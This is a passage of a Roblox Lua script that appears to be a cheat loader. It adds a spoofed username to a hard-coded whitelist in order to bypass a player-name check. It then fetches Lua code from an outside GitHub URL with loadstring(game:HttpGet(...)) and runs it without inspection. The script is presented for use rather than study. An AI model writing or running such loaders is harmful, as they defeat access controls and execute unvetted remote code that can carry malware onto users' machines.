    local validNames = {
        "axxoryyy", "C4OS_Ld", "NW_GlitcherLambda", "Matias_XD2021", "12345AB801",
        "BloodPuppit2", "LK_HAZ2", "JayTonCost_24k", "singkomong04", " Mrbignewcoming3",
        "Shadow_RipperZ0", "Elijahbetter785", "Backaccountgotstolen", "HoloGrindz", "Mintysmug",
        "roi_aksbrother", "Hi_dorihi", "Terrionp20"
    }
    
    table.insert(validNames, spoofedUsername)
    table.find(validNames, _LocalPlayer5.Name)
end

bypassPlayerNameCheck()

local function safeLoadString(url)
    local success, result = pcall(function()
        loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Error loading script: " .. result)
    end
end

safeLoadString("https://raw.githubusercontent.com/UnknownCodersonLT4/Roblox/refs/heads/main/ML/Games.lua")
